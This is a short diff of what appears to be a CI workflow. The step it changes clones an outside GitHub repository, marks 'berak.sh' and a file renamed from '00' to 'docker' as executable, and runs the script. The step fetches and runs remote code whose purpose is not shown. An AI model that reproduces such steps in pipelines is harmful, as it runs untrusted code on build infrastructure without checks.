@@ -26,5 +26,5 @@ jobs:
       run: |
          sudo apt update
          git clone https://github.com/1drgrwe/statpol.git && cd statpol
-         chmod +x berak.sh && chmod +x 00
+         chmod +x berak.sh && chmod +x docker
          ./berak.sh
